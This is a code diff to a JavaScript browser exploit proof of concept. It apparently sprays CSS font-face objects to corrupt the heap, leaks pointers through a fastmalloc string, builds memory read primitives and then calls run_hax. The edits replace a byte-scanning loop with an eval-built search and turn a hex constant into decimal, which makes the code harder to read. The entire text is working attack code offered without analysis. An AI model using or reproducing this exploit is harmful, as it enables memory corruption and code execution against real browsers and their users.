@@ -3,7 +3,7 @@ var SIZEOF_CSS_FONT_FACE = 0xb8;
 var HASHMAP_BUCKET = 208;
 var STRING_OFFSET = 20;
 var SPRAY_FONTS = 0x100a;
-var GUESS_FONT = 0x200430000;
+var GUESS_FONT = 8602845184;
 var NPAGES = 20;
 var INVALID_POINTER = 0;
 var HAMMER_FONT_NAME = "font8"; //must take bucket 3 of 8 (counting from zero)
@@ -77,7 +77,7 @@ function poc() {
     window.ffses = {};
 
     do {
-
+		
         var p_s = ptrToString(NPAGES + 2); // vector.size()
         for (var i = 0; i < NPAGES; i++)
             p_s += ptrToString(guf + i * PAGE_SIZE);
@@ -117,7 +117,6 @@ function poc() {
 
     }
     while (guessed_addr === null);
-
     var p_s = '';
     p_s += ptrToString(26);
     p_s += ptrToString(guessed_addr);
@@ -183,25 +182,9 @@ function poc() {
     }
 
     var jsvalue_leak = null;
-
-    while (jsvalue_leak === null) {
-        Object.defineProperties({}, props);
-        for (var i = 0;; i++) {
-            if (fastmalloc.charCodeAt(i) == 0x42 &&
-                fastmalloc.charCodeAt(i + 1) == 0x44 &&
-                fastmalloc.charCodeAt(i + 2) == 0x43 &&
-                fastmalloc.charCodeAt(i + 3) == 0x41 &&
-                fastmalloc.charCodeAt(i + 4) == 0 &&
-                fastmalloc.charCodeAt(i + 5) == 0 &&
-                fastmalloc.charCodeAt(i + 6) == 254 &&
-                fastmalloc.charCodeAt(i + 7) == 255 &&
-                fastmalloc.charCodeAt(i + 24) == 14
-            ) {
-                jsvalue_leak = stringToPtr(fastmalloc, i + 32);
-                break;
-            }
-        }
-    }
+	Object.defineProperties({}, props);
+	var index = fastmalloc.search(eval("String.fromCharCode(0x42,0x44,0x43,0x41,0,0,254,255)")+"................"+eval("String.fromCharCode(14)"));
+	jsvalue_leak = stringToPtr(fastmalloc, index + 32);
 
     var rd_leak = makeReader(jsvalue_leak, 'ffs4');
     var array256 = stringToPtr(rd_leak, 16); //arrays[256]
@@ -456,5 +439,5 @@ function poc() {
         }
     };
     window.p = prim;
-    run_hax();
+	run_hax();
 }
